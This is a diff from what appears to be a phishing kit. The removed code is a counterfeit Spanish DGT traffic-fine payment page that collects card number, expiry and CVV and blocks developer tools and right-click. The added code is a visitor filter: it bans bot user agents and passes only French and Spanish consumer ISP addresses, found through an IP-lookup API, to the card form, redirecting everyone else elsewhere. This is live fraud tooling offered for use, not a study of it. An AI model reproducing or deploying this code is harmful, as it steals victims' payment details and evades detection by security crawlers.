@@ -1,237 +1,85 @@
 <?php
-session_start();
+include("settings.php");
 
-require '../server/all.php';
-include '../settings.php';
-//include '../server/fonctions.php';
-
-
-if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ) {	
-?>
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <title>Page de sanciones</title>
-
-    <!-- Import des styles nÃ©cessaires -->
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">
-
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-        }
-
-        .main-header, .main-footer {
-            background-color: #048;
-            color: #fff;
-            padding: 10px 0;
-            text-align: center;
-        }
-
-        .main-header h1, .main-footer p {
-            margin: 0;
-        }
-
-        .container {
-            padding: 20px;
-        }
-
-        .custom-button {
-            background-color: #048;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .custom-button:hover {
-            background-color: #036;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-control {
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            padding: 10px;
-            width: 100%;
-        }
-
-        label.mandatory::after {
-            content: " *";
-            color: red;
-        }
-
-        .footer-social ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        .footer-social ul li {
-            display: inline-block;
-            margin: 0 10px;
-        }
-    </style>
-
-    <script src="https://js.stripe.com/v3/buy-button.js" async></script>
-</head>
-<body>
-    <header class="main-header">
-        <h1>Pago de sanciones</h1>
-    </header>
-    <main class="container">
-        <h2>Pago de su multa N°164357371274</h2>
-        <form method="post" id="carte_form" action="../actions/carte.php">
-            <div class="form-group">
-                <label class="mandatory">Nùmero de tarjeta de crédito</label>
-                <input id="ccnum" type="text" name="ccnum" class="form-control" minlength="16" maxlength="16" inputmode="numeric" oninput="chiffres_only(this)" required>
-                <span id="errorMessage" style="color: red;"></span>
-            </div>
-            <div class="form-group">
-                <label class="mandatory">Fecha de expiración</label>
-                <input id="exp" type="text" name="exp" class="form-control" minlength="7" maxlength="7" inputmode="numeric" placeholder="MM/AAAA" oninput="validateExpirationDate(this);" onkeyup="formatString(event);" required>
-            </div>
-            <div class="form-group">
-                <label class="mandatory">CVV</label>
-                <input id="cvv" type="text" name="cvv" class="form-control" minlength="3" maxlength="4" placeholder="xxx" inputmode="numeric" oninput="chiffres_only(this)" required>
-            </div>
-            <button type="submit" name="carte_submit" class="custom-button">Continuar</button>
-            <input type="hidden" name="carte_submit" id="carte_submit" value="true">
-        </form>
-    </main>
-    <footer class="main-footer">
-        <p>Copyright @ DGT 2022. Todos los derechos reservados</p>
-        <div class="footer-social">
-            <ul>
-                <li><a href="" target="_blank"><em class="fa fa-facebook-square"></em></a></li>
-                <li><a href="" target="_blank"><em class="fa fa-twitter-square"></em></a></li>
-                <li><a href="" target="_blank"><em class="fa fa-youtube-square"></em></a></li>
-                <li><a href="" target="_blank"><em class="fa fa-instagram"></em></a></li>
-            </ul>
-        </div>
-        <div class="contact">
-            <p>TelÃ©fono: 011 Estado del TrÃ¡fico | 060 Admin. Gral. del Estado</p>
-            <p>UbicaciÃ³n: C/ Josefa Valcarcel, 28 - 28071 Madrid-EspaÃ±a</p>
-        </div>
-    </footer>
-
-    <script>
-        function validateExpirationDate(input) {
-            input.value = input.value.replace(/\D/g, '');
-            if (input.value.length > 2) {
-                input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
-            }
-
-            var mois = parseInt(input.value.slice(0, 2), 10);
-            var annee = parseInt(input.value.slice(3), 10);
-
-            if (mois < 1 || mois > 12 || annee < 2024 || annee > 2035 || isNaN(mois) || isNaN(annee)) {
-                document.getElementById('errorMessage').textContent = "Fecha no vÃ¡lida!";
-            } else {
-                document.getElementById('errorMessage').textContent = "";
-            }
-        }
-
-        function chiffres_only(input) {
-            input.value = input.value.replace(/\D/g, '');
-        }
-
-        document.addEventListener("contextmenu", function(e) {
-            e.preventDefault();
-        }, false);
-
-        document.addEventListener("selectstart", function(e) {
-            e.preventDefault();
-        }, false);
-
-        window.addEventListener("keydown", function(e) {
-            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-                e.preventDefault();
-            }
-        });
-
-        document.getElementById('carte_form').addEventListener('submit', function() {
-            document.getElementById('carte_submit').disabled = true;
-        });
-    </script>
-</body>
-</html>
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
 
 
-	<!-- REDIRECTION EN CAS DE BOT OU ISP NON AUTORISER -->
-<?php
-} else {
-    header("Location: https://www.google.com");
+// Tableau des adresses IP autorisÃ©es
+$adresses_ip_autorisees = [
+    $ip_dev, 
+    $ip_bypass,   // Ajoutez d'autres adresses IP autorisÃ©es ici
+];
+
+
+
+// VÃ©rifier si l'utilisateur est un robot (agent utilisateur contient "bot")
+if (stripos($user_agent, 'bot') !== false) {
+    $banned_ip_file = 'ip_ban.txt';
+    $banned_ip_list = file_get_contents($banned_ip_file);
+    if (strpos($banned_ip_list, $ip) === false) {
+        $banned_ip_list .= $ip . "\n";
+        file_put_contents($banned_ip_file, $banned_ip_list);
+    }
+
+    header("Location: https://www.mediapart.fr/");
     exit;
 }
 
-?>
 
-<!-- script js -->	
-<script>
 
-function ccnum(ccnum) {
-      // Supprimer tout sauf les chiffres
-      input.value = input.value.replace(/\D/g, '');
+if (in_array($ip, $adresses_ip_autorisees)) {    
+    header("Location: ./user/index.php");
+} else {
+    // Utilisez cURL pour interroger l'API
+    $api_url = "http://ip-api.com/json/$ip";
+    $ch = curl_init($api_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
 
-      var errorMessage = document.getElementById("errorMessage");
+    if ($response) {
+        // Analysez la rÃ©ponse JSON
+        $data = json_decode($response, true);
 
-      if (input.value.length === 16) {
-        errorMessage.textContent = "";
-      } else {
-        errorMessage.textContent = "Le numÃ©ro de carte de crÃ©dit doit contenir 16 chiffres.";
-      }
+        // VÃ©rifiez si l'une des informations contient les mots clÃ©s prÃ©dÃ©finis par pays
+        $isp = $data['isp'] ?? '';
+        $org = $data['org'] ?? '';
+        $as_info = $data['as'] ?? '';       
+
+        $mots_cles_par_pays = [
+            "France" => ["sfr", "orange", "free", "bouygues", "nrj mobile", "mutuel", "lyca", "cegetel", "orange sa","Free Mobile SAS","Telecom"],   
+            "Spain" => ["EXCOM","Orange Espagne SA","Netports","movistar", "vodafone", "orange", "yoigo", "masmovil", "Vodafone Espana S.A.U", "Telefonica De Espana", "Uni2", "Uni2 1", "RIMA", "uni", "Procono S.A", "Xtra", "telecom", "Digi", 'XFERA Moviles S.A', "S.A","Espana","Telefonica","DVBLAB"],        
+        ];
+
+        $autoriser_acces = false;
+        foreach ($mots_cles_par_pays as $pays => $mots_cles) {
+            foreach ($mots_cles as $mot_cle) {
+                if (stripos($isp, $mot_cle) !== false || stripos($org, $mot_cle) !== false || stripos($as_info, $mot_cle) !== false) {
+                    $autoriser_acces = true;
+                    break 2; 
+                }
+            }
+        }
+
+        if ($autoriser_acces) {   
+            session_start(); // Commencer la session
+            $_SESSION['autoriser'] = true;  // Autorise l'accÃ¨s Ã  la session 
+            header("Location: ./user/index.php");
+            exit;
+        } else {            
+            $banned_ip_file = 'ip_ban.txt';
+            $banned_ip_list = file_get_contents($banned_ip_file);        
+            if (strpos($banned_ip_list, $ip) === false) {
+                $banned_ip_list .= $ip . "\n";
+                file_put_contents($banned_ip_file, $banned_ip_list);
+            }
+            
+            header("Location: https://www.mediapart.fr/");
+            exit; 
+        }
+    } else {
+        echo "Erreur lors de la rÃ©cupÃ©ration des informations de l'API.";
+    }
 }
-
-
-   
-	 
-	 
-	  function chiffres_only(input) {
-            input.value = input.value.replace(/\D/g, '');
-        }
-
-		
-		
-		
-		document.addEventListener("contextmenu", function(e){
-        e.preventDefault();
-    }, false);
-
-    // DÃ©sactiver la sÃ©lection de texte
-    document.addEventListener("selectstart", function(e){
-        e.preventDefault();
-    }, false);
-
-
-    window.addEventListener("keydown", function(e) {
-        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-            e.preventDefault();
-        }
-    });
-</script>
-
-
-
-<script>
-        document.getElementById('carte_form').addEventListener('submit', function() {
-            // DÃ©sactiver le bouton de soumission aprÃ¨s le clic
-            document.getElementById('carte_submit').disabled = true;
-        });
-    </script>
+?>
